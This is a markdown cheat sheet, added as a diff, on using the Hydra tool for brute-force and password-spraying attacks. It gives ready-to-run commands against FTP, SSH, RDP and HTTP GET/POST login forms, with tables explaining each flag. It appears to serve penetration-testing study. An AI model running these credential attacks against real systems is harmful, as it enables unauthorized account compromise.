@@ -1,0 +1,62 @@
+---
+title: Hydra
+description:  Hydra is a powerful tool used for performing brute-force attacks on various protocols and services to test the security of authentication mechanisms
+---
+
+## Example
+`$ hydra -t 4 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV TARGET_IP ftp`
+
+
+| SECTION         |   FUNCTION | 
+| --- | ---|
+| -t 4            | Number of parallel connections per target| 
+| -l [USERNAME]   |  Points to the user who's account you're trying to compromise| 
+| -P [path to dictionary]  | Points to the file containing the list of possible passwords| 
+| -vV             |  Sets verbose mode to very verbose, shows the login+pass combination for each attempt| 
+| [TARGET_IP]     |  The IP address of the target machine| 
+| ftp / protocol  |   Sets the protocol (Over 50 different protocols)| 
+
+## Password Spraying
+You can use Hydra to bruteforce usernames as well as passwords
+
+`$ hydra -L usernames-list.txt -p Passw0rd123 ssh://10.1.1.10`
+
+## Bruteforce RDP
+You can attack a Windows Remote Desktop with a password list!
+
+`$ hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`
+
+
+
+
+## Bruteforce HTTP login pages
+
+Form syntax: `<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`
+
+#### GET Example
+`$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f`
+
+| SECTION         |   FUNCTION | 
+| --- | ---|
+| -l admin            | Specify a single username, use `-L` for a username wordlist| 
+| -P  |   Specify the full path of wordlist, use `-p` for a single password| 
+| 10.10.x.x [path to dictionary]  | The IP address or the fully qualified domain name (FQDN) of the target| 
+| http-get-form            | The type of HTTP request, which can be either `http-get-form` or `http-post-form`| 
+| PARAMETERS  |  Specify the URL, path, and conditions.  login-get/index.php is the path of the login page on the target webserver.  username=^USER^&password=^PASS^ are the parameters to brute-force. 
+
+
+#### POST Example
+`$ hydra -l <username> -P <wordlist> 10.10.12.119 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+
+- The login page is only /, i.e., the main IP address.
+- The username is the form field where the username is entered
+- The specified username(s) will replace ^USER^
+- The password is the form field where the password is entered
+- The provided passwords will be replacing ^PASS^
+
+`F=incorrect` is a string that appears in the server reply when the login fails
+
+
+## Resources
+
+- [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
